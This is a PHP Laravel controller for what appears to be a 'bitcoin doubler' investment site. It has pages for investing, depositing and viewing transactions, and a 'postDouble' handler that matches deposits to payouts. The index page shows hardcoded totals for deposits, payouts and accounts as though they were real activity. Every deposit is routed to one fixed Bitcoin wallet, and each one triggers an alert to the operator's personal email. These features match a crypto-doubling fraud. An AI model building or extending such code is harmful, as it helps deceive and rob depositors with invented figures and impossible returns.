<?php namespace App\Http\Controllers;

use App\Http\Requests;
use App\Http\Controllers\Controller;

use Illuminate\Http\Request;
use App\Helpers\Contracts\HelperContract; 
use Auth;
use App\Deposits;
use App\Payouts;
use Session; 
use Validator; 
use Carbon\Carbon; 

class MainController extends Controller {

	protected $helpers; //Helpers implementation
    
    public function __construct(HelperContract $h)
    {
    	$this->helpers = $h;            
    }

	/**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function getIndex()
    {
    	$totalDeposit = "12449.1245786542";
        $totalPayout = "104641.54678413";
        $totalPayoutTransactions = "2045137";
        $totalDepositAccounts = "226312";
    	$latestDeposits = $this->helpers->getDeposits();
        $latestPayouts = $this->helpers->getPayouts();
        
    	return view('index', compact(['latestDeposits', 'latestPayouts','totalDepositAccounts', 'totalPayoutTransactions', 'totalDeposit', 'totalPayout']));
    }
    
    /**
	 * Show the application Invest screen to the user.
	 *
	 * @return Response
	 */
	public function getInvest()
    {       
    	return view('invest');
    }
    
        /**
	 * Show the application Deposit screen to the user.
	 *
	 * @return Response
	 */
	public function getDeposit()
    {      
    	$title = "Deposit";
        $m = "deposit";
    	return view('deposit', compact(['title','m']));
    }
    
    /**
	 * Show the application Deposit screen to the user.
	 *
	 * @return Response
	 */
	public function getDashboard(Request $request)
    {      
    	$title = "Dashboard";
        $m = "dashboard";
        $req = $request->all(); $w = $req['wallet'];                 
        #$latestDeposits = $this->helpers->getDeposits($w);
        #$latestPayouts = $this->helpers->getPayouts($w);
        
    	return view('deposit', compact(['title','latestDeposits', 'latestPayouts', 'm']));
    }
    
    /**
	 * Show the application Deposit screen to the user.
	 *
	 * @return Response
	 */
	public function getTransactions($id="")
    {      
    	$title = "Transactions";
        $m = "transactions";       
        $deposits = "";
        $payouts= "";
        $status = "find";
        
        if($id != ""){
          $status = "view";
          $deposits = $this->helpers->getDeposits($id);
          $payouts = $this->helpers->getPayouts($id);
    
       } 
        
    	return view('transactions', compact(['title','deposits', 'payouts', 'm', 'status']));
    }
    
    /**
	 * Show the application Support screen to the user.
	 *
	 * @return Response
	 */
	public function getSupport()
    {       
    	return view('support');
    }
    
    /**
	 * Show the application Disclaimer screen to the user.
	 *
	 * @return Response
	 */
	public function getTerms()
    {       
    	return view('terms');
    }
    
    
    public function postSignup(Request $request)
	{
           $req = $request->all();
          # dd($req);
          $ret = "";
          $wallet = "1EmRKUyBUY4eqcV8vRZ6BtYiH7AU9xLrkq";              	
               
                $validator = Validator::make($req, [
                             'wallet' => 'required',
                             'amount' => 'required',
                   ]);
         
                 if($validator->fails())
                  {
                       $messages = $validator->messages();
                       return redirect()->back()->withInput()->with('errors',$messages);
                       //dd($messages);
             
                      /* $r = "<div class='alert alert-danger'><strong>Whoops!</strong> There were some problems signing you in.<br><br>";
                       $r .= "<ul>";
					
                       foreach($messages->all() as $error) $ret .= "<li>".$error."</li>";
            
                       $r .= "</ul></div>";
                       $ret = ['mode' => "error", 'error' => $r];
                       */
                 }
                 
                 else if(strlen($req['wallet']) < 32)
				 {
					Session::flash("input-error", "wallet");
					return redirect()->back();
				 }
				
				else if(is_amount($req['amount']) || $req['amount'] < 0.05)
				 {
					Session::flash("input-error", "amount");
					return redirect()->back();
				 }
                
                 else
                 { 
                 	$w = $req['wallet'];
                     $a = $req['amount'];                     
                     
                     $deposit =Deposits::where([ ['wallet',$w], 
                                                                        ['amount',$a], 
                                                                        ['status', "pending"]
                                                                     ])->first();
                    
                    $payout =Payouts::where([ ['wallet',$w],                                                                      
                                                                        ['status', "processing"], 
                                                                     ])->first();                                 
                      
                                             	
                          $statusNumber = $this->helpers->getStatusNumber();
                          $arr = ['email' => "", 'amount' => "", 'wallet' => $w, 'status_number' => $statusNumber];                          
                          $deposit = $this->helpers->addDeposit($arr);
                          $this->helpers->sendEmail("kudayisitobi@gmail.com" ,"User About To Deposit Bitcoin",['arr' => $arr],'emails.deposit_alert','view');  
                          Session::flash("id", $deposit->id);              
    	                  Session::flash("wallet", $wallet);              
                          return redirect()->intended('deposit');                       
                   }                                                                                                   
	}
	
	
	public function postDouble(Request $request)
	{
           $req = $request->all();
          # dd($req);
          $ret = "";
          $wallet = "1EmRKUyBUY4eqcV8vRZ6BtYiH7AU9xLrkq";              	
               
                $validator = Validator::make($req, [
                             'amount' => 'required|numeric',
                             'email' => 'required|email', 
                             'profit_wallet' => 'required', 
                             'wallet' => 'required', 
                             'status_number' => 'required'
                   ]);
         
                 if($validator->fails())
                  {
                       $messages = $validator->messages();
                       return redirect()->back()->withInput()->with('errors',$messages);
                       //dd($messages);
             
                       $r = "<div class='alert alert-danger'><strong>Whoops!</strong> There were some problems signing you in.<br><br>";
                       $r .= "<ul>";
					
                       foreach($messages->all() as $error) $ret .= "<li>".$error."</li>";
            
                       $r .= "</ul></div>";
                       $ret = ['mode' => "error", 'error' => $r];
                 }
                
                 else
                 {                      
                     $deposit =Deposits::where([ ['email',$req['email'] ],                                                                       
                                                                        ['amount',$req['amount'] ], 
                                                                        ['status', "pending"], 
                                                                        ['status_number', $req['status_number'] ]
                                                                     ])->first();                                                                
                                                                     
                      
                    $payout =Payouts::where([ ['email',$req['email'] ],                                                                       
                                                                        ['amount',$req['amount'] ], 
                                                                        ['status', "processing"], 
                                                                        ['wallet', $req['wallet'] ]
                                                                     ])->first();                                            
                      
                     if($deposit != null){
                     	$arr2 = ['mode' => "just-paid", 'email' => $deposit->email, 'amount' => $deposit->amount, 'wallet' => $req['wallet'] ];
                         $this->helpers->addPayout($arr2);
                         $deposit->delete();
                                              	
                         $ret = json_encode($arr2);                                                                     
                     } 
                     
                     else{          
            	         $deposit = $deposit =Deposits::where([ ['email',$req['email'] ],                                                                       
                                                                        ['amount',$req['amount'] ], 
                                                                        ['status', "pending"]
                                                                     ])->first();  
                          
                         if($deposit != null){
                         	 $arr2 = ['mode' => "wrong-status-number"];
                             $ret = json_encode($arr2); 
                         } 
      
                         else if($payout != null){
                         	$arr2 = ['mode' => $payout->status];
                             $ret = json_encode($arr2);                                                  
                         } 
                         
                         else{
                         	 $arr2 = ['mode' => "invalid"];
                             $ret = json_encode($arr2); 
                         } 
                        
                     }                                                              
                 }
                  
                 return $ret;          
	}
	
	
	public function getSeed()
    {
        Deposits::where('status', " active")->update(['status' =>"active"]);
    	return redirect()->intended('/');                           
    }
    
    
    public function postTransactions(Request $request)
	{
           $req = $request->all();
          # dd($req);
          $deposits = null; $payouts= null;
        
               
                $validator = Validator::make($req, [
                             'wallet' => 'required',
                   ]);
         
                 if($validator->fails())
                  {
                       $messages = $validator->messages();
                       return redirect()->back()->withInput()->with('errors',$messages);
                 }
                
                 else
                 { 
                 	$wallet = $req['wallet'];    
                     $title = "Transactions";
                     $m = "transactions";                 
                     
                     $deposits =$this->helpers->getDeposits($wallet);
                     $payouts =$this->helpers->getPayouts($wallet);
                     $ret = array_merge($deposits, $payouts);
          #dd($ret);
                                       
                     $status= "view";              
                     return view('transactions', compact(['title','deposits', 'payouts', 'm', 'status', 'ret']));
                   }                                                                                                   
	}

}
